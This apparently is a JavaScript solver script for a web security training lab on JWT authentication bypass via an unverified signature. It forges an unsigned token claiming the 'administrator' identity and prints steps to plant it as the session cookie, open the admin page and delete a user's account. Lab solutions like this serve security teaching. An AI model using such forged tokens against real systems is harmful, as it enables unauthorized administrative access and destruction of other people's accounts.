import { getParsedInputFromUser } from "../../../utils/getParsedInputFromUser.js";
import { runTasks } from "../../../utils/runTasks.js";

const { labUrl } = getParsedInputFromUser({
  description: "Lab: JWT authentication bypass via unverified signature",
});

runTasks([task]);

function task() {
  console.log(`
To solve the lab:
  1. Edit your browser cookie for the lab site with key "session" and value "${getJwtToken()}"
  2. Go to admin page:
  "${labUrl + "admin"}"
  3. Delete carlos's account
`);
}

function getJwtToken() {
  const adminUsername = "administrator";
  const jwtHeader = JSON.stringify({ alg: "HS256" });
  const jwtPayload = JSON.stringify({ sub: adminUsername });
  return `${Buffer.from(jwtHeader).toString("base64url")}.${Buffer.from(jwtPayload).toString("base64url")}.`;
}
